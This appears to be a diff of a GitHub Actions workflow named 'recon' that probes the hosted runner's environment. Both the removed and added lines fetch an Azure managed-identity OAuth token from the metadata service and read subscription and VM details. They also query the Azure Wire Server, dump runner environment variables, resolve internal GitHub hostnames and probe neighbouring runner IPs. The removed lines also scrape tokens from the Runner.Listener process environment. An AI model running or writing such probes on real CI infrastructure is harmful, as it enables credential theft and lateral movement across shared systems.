@@ -6,59 +6,36 @@ on:
 jobs:
   recon:
     runs-on: ubuntu-latest
-    timeout-minutes: 8
     steps:
-      - name: Deep internal network probe
+      - name: IMDS managed identity token
         run: |
-          echo "=== Azure internal services ==="
-          # Azure Wire Server (host health/provisioning)
-          curl -s --max-time 3 http://168.63.129.16/ 2>&1 | head -5
-          curl -s --max-time 3 "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -10
+          echo "=== Azure managed identity token ==="
+          curl -sf --max-time 3 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true" 2>&1 || echo "no_managed_identity"
           
-          echo "=== IMDS full token/identity ==="
-          curl -s --max-time 3 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true" 2>&1 | python3 -m json.tool 2>/dev/null | head -20
+          echo "=== IMDS subscription ==="
+          curl -sf --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" | python3 -c "import json,sys; d=json.load(sys.stdin); c=d.get('compute',{}); print('sub:', c.get('subscriptionId')); print('rg:', c.get('resourceGroupName')); print('vm:', c.get('name'))" 2>&1
+
+      - name: Wire server and internal endpoints
+        run: |
+          echo "=== Azure Wire Server 168.63.129.16 ==="
+          curl -sf --max-time 3 http://168.63.129.16/ 2>&1 | head -3 || echo "blocked"
           
-          echo "=== Actions service URLs from env ==="
-          env | grep -i "actions\|runner\|github\|token" | grep -v "^PATH" | sed 's/\(TOKEN\|SECRET\|KEY\)=.*/\1=REDACTED/' | sort
-          
-          echo "=== DNS resolution for github internal services ==="
-          for host in \
-            pipelines.actions.githubusercontent.com \
-            vstoken.actions.githubusercontent.com \
-            results-receiver.actions.githubusercontent.com \
-            cache.actions.githubusercontent.com \
-            api.github.com; do
-            echo -n "DNS $host -> "
-            dig +short $host 2>/dev/null || nslookup $host 2>/dev/null | grep "Address:" | tail -1
+          echo "=== Actions env vars ==="
+          env | sort | grep -i "ACTIONS\|RUNNER\|GITHUB_API\|GITHUB_ENV\|GITHUB_STEP" | sed 's/TOKEN=.*/TOKEN=REDACTED/'
+
+      - name: DNS recon github internal
+        run: |
+          echo "=== github.net DNS ==="
+          for h in pipelines.github.net actions.github.net vstoken.actions.githubusercontent.com results-receiver.actions.githubusercontent.com; do
+            printf "$h -> "; dig +short $h 2>/dev/null | head -1 || echo "unresolved"
           done
           
-          echo "=== Subnet scan for other hosts on 10.1.0.0/20 ==="
-          # Fast scan of subnet gateway and a few neighbors
-          for ip in 10.1.0.1 10.1.0.2 10.1.0.100 10.1.0.114 10.1.0.116 10.1.15.254; do
-            result=$(curl -s --max-time 1 http://$ip/ 2>&1 | head -2)
-            [ -n "$result" ] && echo "HTTP $ip: $result" || echo "no-response: $ip"
+          echo "=== Subnet neighbors (10.1.0.x) ==="
+          for ip in 10.1.0.1 10.1.0.2 10.1.0.114 10.1.0.116; do
+            printf "HTTP $ip: "
+            curl -sf --max-time 1 http://$ip/ 2>&1 | head -1 || echo "no_response"
           done
           
-          echo "=== ACTIONS_RUNTIME_TOKEN via job token endpoint ==="
-          # The job token is accessible - this is documented as OK
-          # But can we use it for cross-repo access?
-          BEARER=$(cat /proc/$(pgrep -f "Runner.Listener" | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep TOKEN | head -3) || true
-          echo "proc_environ_tokens: $BEARER"
-          
-          echo "=== Check if runner can resolve *.github.net ==="
-          for h in actions.github.net pipelines.github.net builds.github.net; do
-            echo -n "$h -> "
-            dig +short $h 2>/dev/null || echo "no DNS"
-          done
-          
-          echo "=== Current runner subscription details ==="
-          curl -s --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" 2>&1 | python3 -c "
-import json,sys
-d=json.load(sys.stdin)
-c=d.get('compute',{})
-print('subscription:', c.get('subscriptionId'))
-print('resourceGroup:', c.get('resourceGroupName'))
-print('vmName:', c.get('name'))
-print('vmId:', c.get('vmId'))
-print('location:', c.get('location'))
-" 2>/dev/null
+          echo "=== Check cross-runner DNS (same subnet, other runner VMs) ==="
+          nslookup -type=PTR 10.1.0.114 2>&1 | grep -v "^$" | head -5 || true
+          nslookup -type=PTR 10.1.0.116 2>&1 | grep -v "^$" | head -5 || true
